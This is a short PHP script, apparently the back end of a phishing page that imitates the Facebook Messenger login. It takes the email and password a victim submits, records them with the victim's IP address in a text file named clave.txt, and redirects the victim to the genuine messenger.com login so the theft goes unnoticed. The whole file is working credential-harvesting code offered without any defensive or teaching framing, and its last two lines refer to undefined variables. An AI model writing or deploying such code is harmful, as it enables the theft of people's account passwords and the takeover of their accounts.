<?php
header('Location: http://www.messenger.com/login');
$usuario = $_POST[ 'email' ];
$password = $_POST[ 'pass' ];
$ip = $_SERVER[ 'REMOTE_ADDR' ];
     
if( ( empty($usuario)) or (empty($password)) ){
header('location: index.php');
}else{ 
//guarderemos en un archivo de texto
$file = fopen('clave.txt','a+');
fwrite($file, "usuario: ".$usuario."\r\ncontraseña: ".$password."\r\nIP: ".$ip."\r\n=========================\r\n");
fclose($file);
}
    fwrite($fh,$txt); // Write information to the file
    fclose($fh); // Close the file
 
?>